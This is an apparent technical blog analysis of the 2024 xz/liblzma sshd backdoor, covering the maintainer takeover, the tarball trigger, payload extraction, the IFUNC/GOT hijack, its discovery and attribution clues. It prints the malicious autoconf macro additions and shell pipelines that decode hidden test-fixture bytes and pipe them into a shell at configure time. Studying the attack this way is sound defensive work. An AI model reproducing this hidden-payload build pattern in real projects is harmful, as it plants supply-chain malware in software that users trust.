On March 29, 2024, at 15:51 UTC, Andres Freund posted to the *oss-security* mailing list. Subject: *backdoor in upstream xz/liblzma leading to ssh server compromise*. Within hours: Debian rolled sid back to a pre-5.6 version of xz, Red Hat pulled Fedora 40 Beta and Rawhide, GitHub disabled the upstream `tukaani-project` organization. Red Hat, as CNA, assigned CVE-2024-3094 a CVSS v3.1 base score of 10.0 — the maximum.

What had almost shipped — into Debian, Fedora, Kali, openSUSE — was a pre-authentication remote-code-execution backdoor in `sshd`, hidden inside `liblzma`, xz's compression library. Upstream, OpenSSH and `liblzma` have no dependency on each other. The attack threaded that gap by exploiting two years of accumulated maintainer trust, a shell snippet wedged into an autoconf macro, and an IFUNC resolver that fired before the dynamic linker could mark the global offset table read-only.

The post breaks the attack into five acts: how the attacker got commit rights, how the dropper hid in a release tarball, how it unfolded into an ELF object, how that object hijacked sshd at runtime, and how an unrelated performance anomaly caught it.

## Act I — Arrival

The technical mechanism is exotic. The story that put it in place is mundane: an open-source project with one tired maintainer, a polite contributor who slowly took over, and a pressure campaign of sock-puppet emails complaining about the pace of work. Once the contributor had commit access, the takeover continued in places that don't show up in code review — replacing the maintainer's email on Google's [oss-fuzz](https://github.com/google/oss-fuzz/pull/9960) so vulnerability reports routed to him, [breaking the Landlock sandbox check](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) in CMakeLists, [disabling IFUNC fuzzing](https://github.com/google/oss-fuzz/pull/10667), and four days before discovery, rewriting `SECURITY.md` to prefer private email disclosures over public GitHub advisories. The timeline below is the public-record version, dated and quoted from primary sources — Russ Cox's [xz-timeline](https://research.swtch.com/xz-timeline) is the canonical reference.

By the time the malicious test files land in February 2024, the social-engineering work is done: Jia Tan is a co-maintainer, signs releases, owns the security-disclosure inbox. None of the previous steps had to ship hostile code into the binary. That happens in the next act, in a place no one was looking.

## Act II — The Trigger

Two artifacts ship together when an xz release is cut. The *git tag* contains source committed by the maintainers. The *release tarball* contains the same source plus the output of `autoreconf` — generated `configure` scripts and supporting `m4` macros. Most projects don't audit the second one closely; it's machine-generated, sometimes from a different machine, sometimes by a bot. xz-5.6.1's tarball contained an `m4/build-to-host.m4` that did not exist in git, and that did not match the upstream gnulib version it claimed to be.

<TarballDiff />

The file is named after a stock gnulib macro, but the content diverges from the upstream [gnulib version](https://git.savannah.gnu.org/gitweb/?p=gnulib.git;a=blob_plain;f=m4/build-to-host.m4) it claims to be. Three additions carry the entire trigger (cosmetic and trailing-convenience-block changes elided):

```diff title="m4/build-to-host.m4 — upstream gnulib  vs  xz-5.6.1.tar.gz" frame="code"
 # build-to-host.m4
 dnl Written by Bruno Haible.

 AC_DEFUN([gl_BUILD_TO_HOST],
 [
   ...
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   ...
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  fi
+  AC_CONFIG_COMMANDS([build-to-host],
+    [eval $gl_config_gt | $SHELL 2>/dev/null],
+    [gl_config_gt="eval \$gl_[$1]_config"])
 ])

 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 ])
```

Two pieces in `gl_BUILD_TO_HOST_INIT`: `gl_am_configmake` searches the unpacked source tree for any file with bytes matching `####XXXXX####$` — magic markers crafted into the `bad-3-corrupt_lzma2.xz` test fixture. `gl_path_map` defines the `tr` swap that Act III's first stage uses to reverse the file's deliberate corruption.

In `gl_BUILD_TO_HOST`, the `gl_[$1]_config` line stitches them together into a shell pipeline: `sed` reads the marker file, `eval $gl_path_map` undoes the `tr` corruption, and `$gl_[$1]_prefix -d` decompresses (the prefix is computed from the file extension `.xz`, so it expands to `xz`).

`AC_CONFIG_COMMANDS` is the pivot: it tells autoconf to run `eval $gl_config_gt | $SHELL` after `configure` finishes. The output of the pipeline — Stage-1 — is piped straight into a fresh shell. The next act traces what that shell runs.

## Act III — The Payload

The dropper is small and the obfuscation is mechanical. What ships in the tarball is a handful of new lines wedged into `m4/build-to-host.m4` (the diff above), plus two binary "test fixtures" — `bad-3-corrupt_lzma2.xz` (512 bytes, sha-256 `ecda10d8…16bd`) and `good-large_compressed.lzma` (35 KB, sha-256 `9aef8982…7032`). Together they unfold into a Linux ELF object: `liblzma_la-crc64-fast.o`. The byte-level walk below is cross-referenced against [Russ Cox's xz-script analysis](https://research.swtch.com/xz-script).

### Stage 1 — the macro fires

When `./configure` runs against an xz-5.6.1 tarball, the modified `m4/build-to-host.m4` executes one line on the corrupted-looking test fixture:

```bash title="m4/build-to-host.m4 — the line that fires" frame="code"
tr "\t \-_" " \t_\-" < bad-3-corrupt_lzma2.xz | xz -d
```

The fixture is, deliberately, a malformed xz stream. The `tr` swap reverses the corruption: every tab becomes a space, every space becomes a tab, every `-` becomes `_`, every `_` becomes `-`. After the substitution, `xz -d` decompresses cleanly into a 1.3 KB shell script — call it Stage-1.

### Stage 2 — the chunker

Stage-1 doesn't run anything dangerous yet. Its job is to extract the next layer from the *other* fixture, `good-large_compressed.lzma`:

```bash title="Stage-1.sh — extracting the payload from good-large_compressed.lzma" frame="code"
xz -dc good-large_compressed.lzma \
  | <head-chunker> \
  | tail -c +31233 \
  | tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" \
  | xz -F raw --lzma1 -dc \
  | /bin/sh
```

The `<head-chunker>` is sixteen repetitions of `(head -c +1024 >/dev/null) && head -c +2048`, then one trailing `(head -c +1024 >/dev/null) && head -c +939` cycle. In effect: skip 1024 bytes, take 2048; skip 1024, take 2048; … sixteen times; then skip 1024, take 939. That outputs 33,707 bytes plucked from `good-large_compressed.lzma`'s middle. The trailing `tail -c +31233` keeps the last 2,475.

Those 2,475 bytes are *not* an lzma stream yet. The `tr` translation table that follows — a 95-character source set mapped to the full 0–255 byte range — re-permutes them into a valid raw-lzma1 frame. Decompressed, that frame is the Stage-2 shell script.

The 5.6.0 dropper uses different magic numbers — `tail -c +31265` instead of `+31233`, `head -c +724` instead of `+939`, and a different `tr` table. Same shape, version-specific constants — verified against [Russ Cox's tarballs walk](https://research.swtch.com/xz-script).

### Stage 3 — the .o lands

Stage-2's prologue is unmistakable, and it gates aggressively before doing anything dangerous:

```bash title="Stage-2.sh — opening lines and the build gate" frame="code"
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
```

The script verifies it's running on x86_64 Linux, with gcc and GNU ld, and that the build is happening inside a Debian (`debian/rules` exists) or RPM (`RPM_ARCH=x86_64`) package build. It also requires `enable_shared=yes` and the IFUNC feature flag in `config.h`. Any miss and it exits silently. (That's why running `./configure` on macOS produces nothing — the artifacts are inert outside the gated environment, see [Sam James's canonical FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27).)

On a successful gate, the script patches libtool's config to drop the `-fPIC -DPIC` constraint, re-runs the head-chunker pipeline against the same `good-large_compressed.lzma` with different offsets to extract the actual ELF, and writes it out as `liblzma_la-crc64-fast.o` in the build tree. The configure machinery treats the .o as a normal CRC64 implementation. Linked into `liblzma.so.5`, it ships with the next package upgrade.

### What landed

The .o is small — 86.6 KB — but reports 242 ELF section headers (`e_shnum` at file offset `0x3C` reads `F2 00`). `objdump` filters that down to about a hundred named or loadable sections. The interesting ones, by [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse-engineering, are `_get_cpuid` (the IFUNC entry), `_cpuid` (a CPUID-feature helper), and an opaque blob `.Lx86_code.part.0` (~2.7 KB) that contains the runtime payload.

Act IV picks up there: how a CRC64 implementation in `liblzma` reaches into `sshd`'s address space and rewrites a function pointer in flight.

## Act IV — The Hijack

Three Linux primitives carry the runtime hijack: IFUNC, the GOT, and RELRO. Plus a quiet Debian patch to OpenSSH that brings `liblzma` into `sshd` in the first place.

### The path

OpenSSH upstream does not link `libsystemd`. Most systemd-using distributions patch sshd to call `sd_notify()` so the service manager knows when sshd is ready to accept connections; that small patch is what brings `libsystemd.so.0` into sshd's address space. `libsystemd` in turn links `liblzma.so.5` for journal-log compression.

So on patched distros — Debian sid, Fedora 40 Beta, openSUSE Tumbleweed — the dynamic linker resolves `liblzma` while sshd is starting, before any client connects. The chain is documented in [Sam James's FAQ](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27).

### IFUNC, before RELRO

When the linker resolves an [IFUNC](https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#index-ifunc-function-attribute) symbol — a symbol marked by GCC's `__attribute__((ifunc("...")))` — it invokes a *resolver* function during process startup, and uses whatever pointer that resolver returns as the symbol's actual implementation. The intent is benign: a single CRC64 export can pick the SSE4.2 implementation on machines that have it, or the table-lookup fallback elsewhere. The mechanism runs early in `ld.so` setup, in particular *before* [RELRO](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) marks the global offset table read-only.

That window is the entire attack. Inside the resolver, the [GOT](https://www.airs.com/blog/archives/41) — the table the dynamic linker writes function pointers into for cross-library calls — is still writable.

### The resolver

`_get_cpuid` is the malicious .o's IFUNC entry. Its declared job is to fill a CPUID-features struct. Its actual job is to install hooks. Decoded into AT&T-syntax disassembly:

```asm title="liblzma_la-crc64-fast.o · _get_cpuid (AT&T)" frame="code"
0000000000000000 <_get_cpuid>:
       0: f3 0f 1e fa                   endbr64
       4: 55                            pushq   %rbp
       5: 48 89 f5                      movq    %rsi, %rbp
       8: 4c 89 ce                      movq    %r9, %rsi
       b: 53                            pushq   %rbx
       c: 89 fb                         movl    %edi, %ebx
       e: 81 e7 00 00 00 80             andl    $0x80000000, %edi
      14: 48 83 ec 28                   subq    $0x28, %rsp
      18: 48 89 54 24 18                movq    %rdx, 0x18(%rsp)
      1d: 48 89 4c 24 10                movq    %rcx, 0x10(%rsp)
      22: 4c 89 44 24 08                movq    %r8, 0x8(%rsp)
      27: e8 00 00 00 00                callq   0x2c <_get_cpuid+0x2c>
      2c: 85 c0                         testl   %eax, %eax
      2e: 74 27                         je      0x57 <_get_cpuid+0x57>
```

The function preserves the calling convention so it really *does* return CPUID data when its caller — glibc's IFUNC machinery — invokes it. The hostile code runs in the side effects of the first <Mnemonic op="callq">callq</Mnemonic> at offset `0x27`. That call lands inside the opaque payload blob `.Lx86_code.part.0` (~2.7 KB on disk) and never returns from there directly into normal CRC64 logic.

### The hook

What the blob does is documented in [smx-smx/xzre](https://github.com/smx-smx/xzre)'s reverse-engineering, since the on-disk symbols are deliberately scrambled and the runtime names (`_resolve`, `RSA_public_decrypt`) only exist after the IFUNC has installed the hooks into the live process. Walking the linker's [`_r_debug`](https://refspecs.linuxbase.org/LSB_3.1.1/IA64/spec/r-debug.html) linked list, the payload locates `sshd`'s mapped address range and resolves its GOT entry for [`RSA_public_decrypt`](https://docs.openssl.org/3.0/man3/RSA_public_encrypt/). Because RELRO has not yet marked the GOT read-only, a single <Mnemonic op="movq">movq</Mnemonic> rewrites that entry to point at a malicious stub elsewhere in the .o. Subsequent calls into `RSA_public_decrypt` — which sshd makes during certificate-based auth — flow through the stub instead.

The stub is the exfil point. It treats the RSA modulus `N` not as an integer but as a packed structure: a one-byte tag, an Ed448 signature, and a command string. If the signature verifies against an embedded Ed448 public key, the stub calls `system(cmd)` and the command runs as root, before any password or key authentication completes.

### The gate

The signature scheme is Ed448, not Ed25519 — confirmed by [amlweems/xzbot](https://github.com/amlweems/xzbot)'s working PoC, which extracts the embedded Ed448 public key and ships a honeypot patch for OpenSSH. Without the matching private key, even a connection that knows the modulus layout produces no system call. That keeps the backdoor's blast radius to whoever holds the private key, and stops opportunistic abuse the moment the binary is published.

And yet, in the time between the binary being published and the private key being used, the binary itself gave the game away — not through cryptanalysis, but through a 500-millisecond latency anomaly on ssh logins.

## Act V — The Discovery

What Andres Freund noticed first, in his own words, was *"a few odd symptoms around liblzma … on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors)."* He recorded the slowdown directly. A clean `sshd -h` took `0m0.299s`; the same call against a backdoored `liblzma` took `0m0.807s` — half a second of unexplained CPU on every login.

He chased it with the tools he names in the disclosure: `valgrind` for the memory errors, then `perf record -e intel_pt//ub` to find where execution diverged from the clean binary, then `gdb` with breakpoints before the divergence. Once he traced execution into liblzma's CRC64 path — which sshd has no upstream reason to call — the rest fell into place. He recognized the `RSA_public_decrypt` hook for what it was.

At 15:51 UTC on March 29, 2024, he posted to *oss-security*:

> After observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors) I figured out the answer: The upstream xz repository and the xz tarballs have been backdoored. — Andres Freund, [oss-security 2024/03/29/4 ↗](https://www.openwall.com/lists/oss-security/2024/03/29/4)

## Aftermath

Within seven days of Andres's email, every affected distribution shipped a rollback: Debian rolled sid back to a pre-5.6 xz; Red Hat pulled Fedora 40 Beta and Rawhide; openSUSE, Arch, and Kali pulled or downgraded; Homebrew downgraded xz on macOS as a precaution. GitHub disabled the `tukaani-project` organization for several days, then re-enabled it under Lasse Collin's sole control. Lasse published a maintainer's statement at [tukaani.org/xz-backdoor](https://tukaani.org/xz-backdoor/).

<DistroGrid />

The vulnerable releases reached rolling and pre-release distributions only. Stable lines — Debian stable, Ubuntu LTS, RHEL, Amazon Linux — were still on pre-5.6 versions and were never exposed.

### What this attack proved

1. **Pre-RELRO IFUNC resolution is a writable-GOT window.** Any shared library loaded into `sshd`'s address space — even through an indirect chain like `sshd → libsystemd → liblzma` — can rewrite `sshd`'s function pointers from its own startup code, before `ld.so` marks the GOT read-only.
2. **A single-maintainer open-source project is a trust graph that can be slowly taken over.** Two years of polite contributions, sock-puppet pressure, and patient role accumulation got hostile bytes into a place every Linux server pulls from.
3. **A 500 ms latency anomaly was the only signal that fired.** No fuzzer, no SBOM check, no reproducible-build audit caught it. A developer noticed `sshd` was slow, and chased it.

## Attribution — who was Jia Tan?

What we know is what Jia Tan *did*. Who Jia Tan *was* — real name, real affiliation, real geography — is not public, and may never be. The most rigorous open analysis to date is by Rhea Karty (Dartmouth) and Simon Henniger (TU Munich), [published April 2024](https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and). What follows is theirs.

### Timezone — claimed vs actual

Almost every Jia Tan commit is timestamped **UTC+8** — Chinese Standard Time. A handful are stamped **UTC+2** or **UTC+3** — Eastern European Time and its summer variant. Forgetting to set a fake timezone before commit is a one-way error: someone really in UTC+8 will not accidentally produce UTC+3 timestamps. Someone in EET who forgot to fake the timezone will.

The slipups Karty and Henniger logged are concrete:

- **2022-10-06:** two commits ~11 hours apart, one stamped `+0300`, the other `+0800`.
- **2023-06-27:** two commits minutes apart, one stamped `+0300`, the other `+0800`.
- **Total:** 3 commits stamped UTC+02, 6 stamped UTC+03, all the rest UTC+08.

### Chinese holidays

If Jia Tan were actually in mainland China, two periods in 2023 should show activity gaps: the **Lunar New Year** (January 22–27) and the **Mid-Autumn Festival** (September 29). Neither does. Jia Tan committed normally through both. Specific examples, verifiable on GitHub:

- **2023-01-24, 12:48 UTC** — *liblzma: Fix documentation in filter.h for lzma_str_to_filters()* — [`f35d98e2`](https://github.com/tukaani-project/xz/commit/f35d98e20609e0be6a04ae2604bfb7cb9d5bd5e4)
- **2023-01-27, 12:14 UTC** — *Translations: Add Brazilian Portuguese translation of man pages* — [`3b1c8ac8`](https://github.com/tukaani-project/xz/commit/3b1c8ac8d1d553cbb1fb22b545d2b1424c752b76)
- **2023-09-29, 11:58 UTC** — *CMake: Specify LINKER_LANGUAGE for libgnu target* — [`506d0312`](https://github.com/tukaani-project/xz/commit/506d03127a8565442b028ec991e1578124fd3025)
- **2023-09-29, 14:11 UTC** — *CI: Disable CLANG64 MSYS2 environment until bug is resolved* — [`01e34aa1`](https://github.com/tukaani-project/xz/commit/01e34aa1171b04f8b28960b1cc6135a903e0c13d)

Three commits on the Mid-Autumn Festival itself; routine maintenance work spread across the Lunar New Year week. Not the cadence of someone observing the holidays.

### Sock-puppet coordination

The pressure emails to xz-devel came from accounts — *Jigar Kumar*, *Dennis Ens* — with no other public footprint anywhere on the internet. Their timing aligned with what Jia Tan needed to happen at each step: push for a co-maintainer right when Lasse was burnt out, demand release pace right before commit access changed. Whether *Jigar Kumar* and *Jia Tan* were the same operator typing from two terminals or two coordinated operators is not knowable from the public record. They were almost certainly the same operation.

### What we don't know

The patience of the operation (≥2 years), the budget required to keep an identity active across that span, and the technical sophistication of the runtime payload all point to a state-aligned actor, not a freelance researcher or a criminal group. Public attribution remains speculative — no government has named a suspect, no suspect has been arrested. Treat any specific naming you see online as unverified.
